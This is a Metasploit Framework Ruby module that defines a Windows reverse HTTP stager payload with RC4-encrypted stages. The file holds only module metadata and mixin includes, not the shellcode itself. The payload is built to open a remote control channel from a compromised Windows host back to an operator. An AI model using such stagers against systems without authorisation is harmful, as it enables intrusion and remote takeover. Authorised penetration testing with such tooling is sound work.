# -*- coding: binary -*-
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_http'
require 'msf/core/payload/windows/reverse_http_rc4'

module Metasploit4

  CachedSize = 327

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseHttpRc4

  def self.handler_type_alias
    "reverse_http_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows Reverse HTTP Stager (wininet, RC4 Stage Encryption, Metasm)',
      'Description' => 'Tunnel communication over HTTP (Windows wininet)',
      'Author'      => 'RageLtMan',
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseHttp,
      'Convention'  => 'sockedi http'))
  end

end
